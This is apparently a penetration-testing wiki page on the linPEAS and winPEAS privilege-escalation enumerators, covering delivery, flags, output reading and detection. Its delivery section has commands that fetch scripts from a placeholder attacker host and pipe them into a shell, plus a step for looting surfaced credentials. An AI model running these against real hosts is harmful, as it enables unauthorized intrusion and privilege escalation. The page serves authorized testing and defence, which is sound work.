# PEASS — linPEAS & winPEAS

The **Privilege Escalation Awesome Scripts SUITE** ([PEASS-ng](https://github.com/peass-ng/PEASS-ng)): **linPEAS** (Linux) and **winPEAS** (Windows). The most thorough automated privesc enumerator, and the one to run **first** on any host. Output is **colour-coded** — red/yellow means roughly "95% a privesc vector" — so skim for those before reading everything.

> Authorized testing only. It's **loud**: touches thousands of files, trips AV/EDR, fills logs. Note it in your engagement `tools.txt`, and confirm every finding by hand — see [reading the output](#reading-the-output).

## Contents

- [Get it onto the target](#get-it-onto-the-target)
- [linPEAS](#linpeas)
- [winPEAS](#winpeas)
- [Reading the output](#reading-the-output)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Get it onto the target

Prefer running **in memory** — nothing on disk is quieter and leaves nothing to clean up.

```bash
# attack box: serve the folder holding the scripts
python3 -m http.server 80
```

```bash
# Linux target — straight from memory:
curl -sL http://ATTACKER/linpeas.sh | sh
wget -qO- http://ATTACKER/linpeas.sh | sh
# or pull the latest release if the box has internet (note: -L + the /download/ path):
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```powershell
# Windows target — download then run:
iwr -Uri http://ATTACKER/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
```

Other channels (SMB, nc, certutil) in [netcat](../Shell/netcat.md) and [smb](../Protocols/smb.md). Save output into your engagement `scans/`.

## linPEAS

```bash
./linpeas.sh                       # full scan
./linpeas.sh -a                    # all checks, including the slow ones
./linpeas.sh -s                    # stealth + superfast: skip noisy/slow checks
./linpeas.sh -e                    # extra enumeration
./linpeas.sh -o SysI,Devs,AvaSof   # only these sections (see -L for the list)
./linpeas.sh -P mypassword         # supply sudo password so it can test sudo perms
./linpeas.sh -L                    # list the check groups
```

| Flag | Does |
| --- | --- |
| `-a` | All checks, including the slow ones |
| `-s` | Stealth / superfast — fewer, quieter checks |
| `-e` | Extra enumeration |
| `-o <list>` | Run only selected sections |
| `-P <pass>` | Sudo password, so it can check `sudo -l`-style perms |
| `-L` | List available checks |
| `-q` / `-h` | Quiet / help |

Keep the colours when you save — view with `less -r`:

```bash
./linpeas.sh -a | tee scans/linpeas.txt      # then: less -r scans/linpeas.txt
```

## winPEAS

```cmd
winPEASx64.exe                      :: full scan (x64, or the universal build below)
winPEASany.exe                      :: universal .NET build when unsure of arch
winPEASx64.exe quiet                :: no banner
winPEASx64.exe fast                 :: skip the slow checks
winPEASx64.exe systeminfo           :: one module only (userinfo, systeminfo, servicesinfo, processinfo, ...)
winPEASx64.exe searchall            :: also search files/registry for passwords (slow)
winPEASx64.exe quiet cmd fast       :: args combine
```

`winpeas.bat` is the fallback when .NET won't run, but it finds far less — prefer the `.exe`.

## Reading the output

PEASS finds **candidates**; you confirm findings.

1. **Skim for red/yellow first** — don't read top to bottom.
2. **Map each hit to a technique:** SUID/sudo/cron → [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) + [GTFOBins](https://gtfobins.github.io); Windows service/token → [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md).
3. **Verify by hand** before it's a finding — that's also your report's reproduction step.
4. **Loot creds** it surfaces → [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md).

## Defense / detection

- Noisy by design: a burst of reads across `/etc`, SUID enumeration and `sudo -l` in seconds. winPEAS binaries hit AV signatures immediately.
- A service account (`www-data`, a DB user) enumerating the whole host is a strong alert — [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md).
- Real fix is removing what it finds — [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md), [2. Windows Hardening](../../Defense/System%20and%20Services%20Hardening/2.%20Windows%20Hardening.md).

## Related

[folder README](README.md) · [LinEnum](LinEnum.md) · [linuxprivchecker](linuxprivchecker.md) · [Seatbelt](Seatbelt.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Windows Privilege Escalation](../Windows/Privilege%20Escalation.md)
